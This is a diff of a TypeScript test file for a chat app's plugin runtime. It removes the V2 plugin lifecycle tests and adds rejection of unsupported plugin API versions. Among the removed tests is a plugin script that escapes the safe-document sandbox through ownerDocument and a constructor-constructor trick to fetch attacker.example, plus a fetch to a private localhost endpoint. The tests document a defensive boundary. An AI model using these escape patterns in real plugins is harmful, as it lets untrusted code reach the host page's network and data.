@@ -97,10 +97,6 @@ vi.mock('./pluginPermissions', () => ({
   getPluginPermission: pluginPermissionMocks.getPluginPermission,
 }))
 
-vi.mock('./pluginSafety', () => ({
-  checkCodeSafety: vi.fn(async (script: string) => ({ isSafe: true, errors: [], modifiedCode: script })),
-}))
-
 import {
   clearCachedServerCommandRevision,
   setCachedServerCommandRevision,
@@ -114,25 +110,28 @@ import {
   resetPendingMutationOutboxForTests,
 } from '../server/pendingMutationOutbox'
 import { replayPendingMutations } from '../server/pendingMutationReplay'
-import { setResourceWriteGuardEnabled, withTrustedResourceWrite } from '../server/resourceWriteGuard.svelte'
+
 import { selectedCharID } from '../stores.svelte'
-import { getDatabase, setDatabaseLite, updateModelPreset, type Database } from '../storage/database.svelte'
+import { setDatabaseLite, updateModelPreset, type Database } from '../storage/database.svelte'
 import { SafeLocalPluginStorage } from './pluginSafeClass'
 import { loadV3Plugins } from './apiV3/v3.svelte'
 import {
   checkPluginUpdate,
   customProviderStore,
+  getPluginRuntimeState,
   getV2PluginAPIs,
   importPlugin,
-  loadV2Plugin,
+  loadPlugins,
   pluginRuntimeSignature,
   pluginV2,
   startPluginRuntimeSync,
   stopPluginRuntimeSync,
+  UnsupportedPluginApiVersionError,
   updatePlugin,
   type RisuPlugin,
 } from './plugins.svelte'
 import type { RisuModule } from '../process/modules'
+import { getDatabase, withTestDatabaseWrite } from 'src/ts/__tests__/resourceDatabaseState'
 
 interface CapturedFetch {
   url: string
@@ -409,7 +408,6 @@ beforeEach(() => {
   pluginPermissionMocks.getPluginPermission.mockReset()
   pluginPermissionMocks.getPluginPermission.mockResolvedValue(true)
   vi.mocked(loadV3Plugins).mockClear()
-  setResourceWriteGuardEnabled(false)
   setDatabaseLite({
     currentPluginProvider: 'old-provider',
     pluginCustomStorage: {},
@@ -423,15 +421,51 @@ beforeEach(() => {
 afterEach(() => {
   stopPluginRuntimeSync()
   setServerCommandSuccessReconciler(null)
-  setResourceWriteGuardEnabled(false)
 })
 
 describe('plugin runtime synchronization', () => {
+  it.each([2, '2.1'] as const)('throws when a V%s-series plugin reaches the runtime', async (version) => {
+    setDatabaseLite({
+      ...getDatabase(),
+      plugins: [{ ...seedPlugin('unsupported-plugin'), version } as unknown as RisuPlugin],
+    })
+
+    await expect(loadPlugins()).rejects.toEqual(new UnsupportedPluginApiVersionError('unsupported-plugin', version))
+    expect(loadV3Plugins).not.toHaveBeenCalled()
+    expect(getPluginRuntimeState()).toMatchObject({
+      phase: 'error',
+      error: expect.any(UnsupportedPluginApiVersionError),
+    })
+  })
+
+  it('reconciles an accepted projection that lands while the initial runtime load is pending', async () => {
+    const initialLoad = createDeferred<void>()
+    vi.mocked(loadV3Plugins).mockImplementationOnce(() => initialLoad.promise)
+
+    const loading = loadPlugins()
+    await vi.waitFor(() => expect(loadV3Plugins).toHaveBeenCalledOnce())
+    expect(getPluginRuntimeState()).toMatchObject({ phase: 'loading' })
+
+    withTestDatabaseWrite(() => {
+      getDatabase().plugins.push(seedPlugin('plugin-late'))
+    })
+    initialLoad.resolve(undefined)
+    await loading
+
+    expect(loadV3Plugins).toHaveBeenCalledTimes(2)
+    expect(vi.mocked(loadV3Plugins).mock.calls[1][0].map((plugin) => plugin.name)).toEqual(['plugin-a', 'plugin-late'])
+    expect(getPluginRuntimeState()).toMatchObject({
+      phase: 'ready',
+      targetSignature: pluginRuntimeSignature(getDatabase().plugins),
+      error: null,
+    })
+  })
+
   it('ignores live argument edits but reloads external script and membership projections', async () => {
     startPluginRuntimeSync()
     flushSync()
 
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       const plugin = getDatabase().plugins[0]
       getDatabase().plugins[0] = {
         ...plugin,
@@ -452,7 +486,7 @@ describe('plugin runtime synchronization', () => {
       ]),
     )
 
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       getDatabase().plugins[0] = {
         ...getDatabase().plugins[0],
         script: 'Risuai.log("authoritative update")',
@@ -468,7 +502,7 @@ describe('plugin runtime synchronization', () => {
       }),
     ])
 
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       getDatabase().plugins.push(seedPlugin('plugin-external'))
     })
     flushSync()
@@ -490,7 +524,7 @@ describe('plugin runtime synchronization', () => {
     startPluginRuntimeSync()
     flushSync()
 
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       getDatabase().plugins[0] = { ...getDatabase().plugins[0], enabled: true }
     })
     flushSync()
@@ -500,7 +534,7 @@ describe('plugin runtime synchronization', () => {
 
     // Simulate runServerCommand's failure rollback while plugin-a is still
     // being started. The final queued pass must unload the rejected runtime.
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       getDatabase().plugins[0] = { ...getDatabase().plugins[0], enabled: false }
     })
     flushSync()
@@ -512,6 +546,18 @@ describe('plugin runtime synchronization', () => {
 })
 
 describe('plugin import/update freshness', () => {
+  it('throws before persisting an API V2.1 plugin import', async () => {
+    const calls = stubCommandFetch()
+
+    await expect(importPlugin(pluginSource('unsupported-plugin', { api: '2.1' }))).rejects.toEqual(
+      new UnsupportedPluginApiVersionError('unsupported-plugin', '2.1'),
+    )
+
+    expect(calls).toEqual([])
+    expect(getDatabase().plugins.map((plugin) => plugin.name)).toEqual(['plugin-a'])
+    expect(pluginImportMocks.alertError).not.toHaveBeenCalled()
+  })
+
   it('deduplicates concurrent checks and caches a successful no-update result', async () => {
     const updateURL = 'https://plugins.example/no-update.js'
     const fetchMock = vi.fn(async () => new Response('//@version 1.0.0\nRisuai.log("same")', { status: 206 }))
@@ -1011,244 +1057,6 @@ describe('plugin import/update freshness', () => {
   })
 })
 
-describe('V2 plugin unload lifecycle', () => {
-  function clearPluginV2State() {
-    pluginV2.providers.clear()
-    pluginV2.providerOptions.clear()
-    pluginV2.editdisplay.clear()
-    pluginV2.editoutput.clear()
-    pluginV2.editprocess.clear()
-    pluginV2.editinput.clear()
-    pluginV2.replacerbeforeRequest.clear()
-    pluginV2.replacerafterRequest.clear()
-    pluginV2.unload.clear()
-    pluginV2.loaded = false
-    customProviderStore.set([])
-  }
-
-  function seedPluginV2Registrations() {
-    const edit = (content: string) => content
-    pluginV2.providers.set('stale-provider', async () => ({ success: true, content: '' }))
-    pluginV2.providerOptions.set('stale-provider', { tokenizer: 'stale-tokenizer' })
-    pluginV2.editdisplay.add(edit)
-    pluginV2.editoutput.add(edit)
-    pluginV2.editprocess.add(edit)
-    pluginV2.editinput.add(edit)
-    pluginV2.replacerbeforeRequest.add((content) => content)
-    pluginV2.replacerafterRequest.add((content) => content)
-    customProviderStore.set(['stale-provider'])
-  }
-
-  function expectPluginV2RegistrationsCleared() {
-    expect(pluginV2.providers.size).toBe(0)
-    expect(pluginV2.providerOptions.size).toBe(0)
-    expect(pluginV2.editdisplay.size).toBe(0)
-    expect(pluginV2.editoutput.size).toBe(0)
-    expect(pluginV2.editprocess.size).toBe(0)
-    expect(pluginV2.editinput.size).toBe(0)
-    expect(pluginV2.replacerbeforeRequest.size).toBe(0)
-    expect(pluginV2.replacerafterRequest.size).toBe(0)
-    expect(pluginV2.unload.size).toBe(0)
-    expect(get(customProviderStore)).toEqual([])
-  }
-
-  beforeEach(() => {
-    clearPluginV2State()
-    pluginV2.loaded = true
-  })
-
-  afterEach(() => {
-    clearPluginV2State()
-    vi.useRealTimers()
-    delete (globalThis as Record<string, unknown>).__v2StaleMutation
-    delete (globalThis as Record<string, unknown>).__v2TimerRuns
-    delete (globalThis as Record<string, unknown>).__v2ListenerRuns
-  })
-
-  it('isolates throwing unload callbacks and clears registrations before the next reload', async () => {
-    seedPluginV2Registrations()
-    const unload = vi.fn(() => {
-      throw new Error('unload failed')
-    })
-    pluginV2.unload.add(unload)
-    const error = vi.spyOn(console, 'error').mockImplementation(() => undefined)
-
-    await expect(loadV2Plugin([])).resolves.toBeUndefined()
-
-    expect(unload).toHaveBeenCalledOnce()
-    expect(error).toHaveBeenCalledWith('Error running V2 plugin unload callback:', expect.any(Error))
-    expectPluginV2RegistrationsCleared()
-    await expect(loadV2Plugin([])).resolves.toBeUndefined()
-    expect(unload).toHaveBeenCalledOnce()
-    error.mockRestore()
-  })
-
-  it('times out pending unload callbacks and lets a later reload proceed', async () => {
-    seedPluginV2Registrations()
-    pluginV2.unload.add(() => new Promise<void>(() => undefined))
-    const timeout = createDeferred<void>()
-    pluginImportMocks.sleep.mockReturnValueOnce(timeout.promise)
-
-    let settled = false
-    const load = loadV2Plugin([]).then(() => {
-      settled = true
-    })
-    await Promise.resolve()
-    await Promise.resolve()
-
-    expect(settled).toBe(false)
-    expect(pluginImportMocks.sleep).toHaveBeenCalledWith(1000)
-    timeout.resolve(undefined)
-    await load
-
-    expectPluginV2RegistrationsCleared()
-    await expect(loadV2Plugin([])).resolves.toBeUndefined()
-  })
-
-  it('keeps delayed V2.1 network calls bound to each script after another plugin becomes ambient', async () => {
-    const firstScript = `setTimeout(() => fetch('https://first.example.test/data'), 10)`
-    const secondScript = `fetch('https://second.example.test/data')`
-    const first = seedPlugin('first-plugin', { version: '2.1', script: firstScript })
-    const second = seedPlugin('second-plugin', { version: '2.1', script: secondScript })
-    const fetchCalls: Array<{ url: string; init: RequestInit }> = []
-    vi.stubGlobal(
-      'fetch',
-      vi.fn(async (input: RequestInfo | URL, init: RequestInit = {}) => {
-        fetchCalls.push({ url: String(input), init })
-        return new Response('ok')
-      }),
-    )
-    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
-
-    await loadV2Plugin([first, second])
-    await vi.waitFor(() => expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledTimes(4))
-    await vi.waitFor(() => expect(fetchCalls).toHaveLength(2))
-
-    expect(pluginPermissionMocks.getPluginPermission.mock.calls).toEqual(
-      expect.arrayContaining([
-        [first.name, 'legacyRuntime', false, first.script],
-        [second.name, 'legacyRuntime', false, second.script],
-        [first.name, 'network', false, first.script, expect.any(Function)],
-        [second.name, 'network', false, second.script, expect.any(Function)],
-      ]),
-    )
-    expect(fetchCalls.every((call) => call.url === '/api/v1/proxy/plugin-fetch')).toBe(true)
-    const upstreamUrls = fetchCalls.map((call) =>
-      decodeURIComponent((call.init.headers as Record<string, string>)['risu-url']),
-    )
-    expect(upstreamUrls).toEqual(
-      expect.arrayContaining(['https://first.example.test/data', 'https://second.example.test/data']),
-    )
-    log.mockRestore()
-  })
-
-  it('blocks a bare V2.1 fetch to a private target before consent or browser networking', async () => {
-    const script = `fetch('http://127.0.0.1:6419/api/v1/bootstrap').catch(() => {})`
-    const plugin = seedPlugin('private-fetch-plugin', { version: '2.1', script })
-    const browserFetch = vi.fn(async () => new Response('unexpected'))
-    vi.stubGlobal('fetch', browserFetch)
-    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
-
-    await loadV2Plugin([plugin])
-    await new Promise((resolve) => setTimeout(resolve, 0))
-
-    expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledOnce()
-    expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledWith(
-      plugin.name,
-      'legacyRuntime',
-      false,
-      plugin.script,
-    )
-    expect(browserFetch).not.toHaveBeenCalled()
-    log.mockRestore()
-  })
-
-  it('skips a V2.1 script entirely when trusted legacy runtime access is denied', async () => {
-    const script = `globalThis.__deniedV2Ran = true`
-    const plugin = seedPlugin('denied-legacy-plugin', { version: '2.1', script })
-    pluginPermissionMocks.getPluginPermission.mockResolvedValue(false)
-    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined)
-
-    await loadV2Plugin([plugin])
-
-    expect((globalThis as any).__deniedV2Ran).toBeUndefined()
-    expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledWith(plugin.name, 'legacyRuntime', false, script)
-    warn.mockRestore()
-  })
-
-  it('requests trusted legacy runtime access again for a changed script', async () => {
-    const first = seedPlugin('changing-legacy-plugin', { version: '2.1', script: `void 'first'` })
-    const second = seedPlugin('changing-legacy-plugin', { version: '2.1', script: `void 'second'` })
-    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
-
-    await loadV2Plugin([first])
-    await loadV2Plugin([second])
-
-    expect(pluginPermissionMocks.getPluginPermission.mock.calls).toEqual(
-      expect.arrayContaining([
-        [first.name, 'legacyRuntime', false, first.script],
-        [second.name, 'legacyRuntime', false, second.script],
-      ]),
-    )
-    log.mockRestore()
-  })
-
-  it('revokes stale mutation closures and cleans timers and listeners when a V2.1 runtime reloads', async () => {
-    vi.useFakeTimers()
-    const calls = stubCommandFetch()
-    const script = `
-      globalThis.__v2TimerRuns = 0
-      globalThis.__v2ListenerRuns = 0
-      globalThis.__v2StaleMutation = () => setDatabaseLite({ currentPluginProvider: 'stale-provider' })
-      setTimeout(() => {
-        globalThis.__v2TimerRuns += 1
-        setDatabaseLite({ currentPluginProvider: 'timer-provider' })
-      }, 100)
-      addEventListener('risu-v2-runtime-test', () => {
-        globalThis.__v2ListenerRuns += 1
-        setDatabaseLite({ currentPluginProvider: 'listener-provider' })
-      })
-    `
-    const plugin = seedPlugin('lifecycle-plugin', { version: '2.1', script })
-    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
-
-    await loadV2Plugin([plugin])
-    await loadV2Plugin([])
-
-    expect(() => (globalThis as any).__v2StaleMutation()).toThrow(/no longer active/)
-    window.dispatchEvent(new Event('risu-v2-runtime-test'))
-    await vi.advanceTimersByTimeAsync(100)
-
-    expect((globalThis as any).__v2TimerRuns).toBe(0)
-    expect((globalThis as any).__v2ListenerRuns).toBe(0)
-    expect(getDatabase().currentPluginProvider).toBe('old-provider')
-    expect(calls.some((call) => call.url.includes('/api/v1/commands/'))).toBe(false)
-    log.mockRestore()
-  })
-
-  it('documents that an approved V2.1 runtime remains trusted main-page code', async () => {
-    const script = `
-      safeDocument['body']['ownerDocument']['defaultView']['fetch']('https://attacker.example/dom-bypass')
-      ;({})['constructor']['constructor']('return this')()['fetch']('https://attacker.example/function-bypass')
-    `
-    const plugin = seedPlugin('trusted-main-realm-plugin', { version: '2.1', script })
-    const browserFetch = vi.fn(async (_input: RequestInfo | URL) => new Response('ok'))
-    vi.stubGlobal('fetch', browserFetch)
-    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
-
-    await loadV2Plugin([plugin])
-    await vi.waitFor(() => expect(browserFetch).toHaveBeenCalledTimes(2))
-
-    expect(browserFetch.mock.calls.map(([url]) => url)).toEqual([
-      'https://attacker.example/dom-bypass',
-      'https://attacker.example/function-bypass',
-    ])
-    expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledOnce()
-    expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledWith(plugin.name, 'legacyRuntime', false, script)
-    log.mockRestore()
-  })
-})
-
 describe('plugin database command bridge', () => {
   it.each([
     ['the legacy database proxy', (apis: ReturnType<typeof getV2PluginAPIs>) => apis.getDatabase()],
@@ -1314,16 +1122,9 @@ describe('plugin database command bridge', () => {
     expect(getDatabase().currentPluginProvider).toBe('provider-a')
   })
 
-  it('setArg updates plugin realArg through a command without throwing under the resource write guard', async () => {
+  it('setArg updates plugin realArg through its owner command', async () => {
     const calls = stubCommandFetch()
     const apis = getV2PluginAPIs()
-    setResourceWriteGuardEnabled(true)
-
-    // Baseline: the guard is active, so a raw projection write throws.
-    expect(() => {
-      getDatabase().plugins[0].realArg['raw'] = 'x'
-    }).toThrow(/resource database compatibility view is read-only/)
-
     let persistence: ReturnType<typeof apis.setArg> | undefined
     expect(() => {
       persistence = apis.setArg('plugin-a::myarg', 'myvalue')
@@ -1651,8 +1452,7 @@ describe('plugin database command bridge', () => {
         return jsonResponse({ error: `unexpected ${url}` }, 404)
       }) as unknown as typeof fetch,
     )
-    setResourceWriteGuardEnabled(true)
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       getDatabase().moduleIntergration = 'old-modules'
       getDatabase().plugins = [seedPlugin('plugin-a')]
       getDatabase().currentPluginProvider = 'plugin-a'
@@ -1669,7 +1469,7 @@ describe('plugin database command bridge', () => {
     })
     expect(getDatabase().moduleIntergration).toBe('attempted-modules')
 
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       getDatabase().plugins.push(
         seedPlugin('plugin-newer', {
           realArg: { mode: 'newer-plugin' },
@@ -1733,10 +1533,9 @@ describe('plugin database command bridge', () => {
         return jsonResponse({ error: `unexpected ${url}` }, 404)
       }) as unknown as typeof fetch,
     )
-    setResourceWriteGuardEnabled(true)
     const oldCustomModels = [{ id: 'old-model', name: 'Old Model' }] as unknown as Database['customModels']
     const attemptedCustomModels = [{ id: 'attempted-model', name: 'Attempted Model' }]
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       getDatabase().customModels = oldCustomModels
       getDatabase().moduleIntergration = 'old-modules'
       getDatabase().plugins = [seedPlugin('plugin-a')]
@@ -1759,7 +1558,7 @@ describe('plugin database command bridge', () => {
     expect(getDatabase().customModels).toEqual(attemptedCustomModels)
     expect(getDatabase().moduleIntergration).toBe('attempted-modules')
 
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       getDatabase().plugins.push(
         seedPlugin('plugin-newer', {
           realArg: { mode: 'newer-plugin' },
@@ -1978,7 +1777,7 @@ describe('plugin database command bridge', () => {
     })
     expect(getDatabase().modules[0].description).toBe('attempted description')
 
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       getDatabase().modules[0] = {
         ...getDatabase().modules[0],
         description: 'newer description',
@@ -2234,7 +2033,7 @@ describe('plugin database command bridge', () => {
     })
     expect(getDatabase().plugins.map((plugin) => plugin.name)).toEqual(['plugin-b', 'plugin-d', 'plugin-a'])
 
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       const pluginDIndex = getDatabase().plugins.findIndex((plugin) => plugin.name === 'plugin-d')
       getDatabase().plugins[pluginDIndex] = {
         ...getDatabase().plugins[pluginDIndex],
@@ -2326,7 +2125,7 @@ describe('plugin database command bridge', () => {
     })
     expect(getDatabase().plugins.map((plugin) => plugin.name)).toEqual(['plugin-a', 'plugin-d', 'plugin-b'])
 
-    withTrustedResourceWrite(() => {
+    withTestDatabaseWrite(() => {
       getDatabase().currentPluginProvider = 'plugin-d'
       getDatabase().pluginCustomStorage.newerStorage = { value: 'kept' }
     })
@@ -2573,7 +2372,7 @@ describe('plugin database command bridge', () => {
     expect(Object.keys(safeDb)).not.toContain('botPresets')
   })
 
-  it('M8: pluginStorage.getItem clones only the selected key without a whole-DB snapshot', () => {
+  it('pluginStorage.getItem clones only the selected key without a whole-DB snapshot', () => {
     const apis = getV2PluginAPIs()
     const largeBody = 'x'.repeat(80_000)
     getDatabase().characters = [
@@ -2617,7 +2416,7 @@ describe('plugin database command bridge', () => {
     })
   })
 
-  it('M8: pluginStorage.getItem preserves missing scalar and falsey results', () => {
+  it('pluginStorage.getItem preserves missing scalar and falsey results', () => {
     const apis = getV2PluginAPIs()
     getDatabase().pluginCustomStorage = {
       empty: '',
@@ -2646,7 +2445,7 @@ describe('plugin database command bridge', () => {
     expect(Object.prototype.hasOwnProperty.call(getDatabase(), 'pluginCustomStorage')).toBe(false)
   })
 
-  it('M8: pluginStorage.getItem detaches array values from live plugin storage', () => {
+  it('pluginStorage.getItem detaches array values from live plugin storage', () => {
     const apis = getV2PluginAPIs()
     getDatabase().pluginCustomStorage = {
       arrayValue: [{ label: 'live' }],
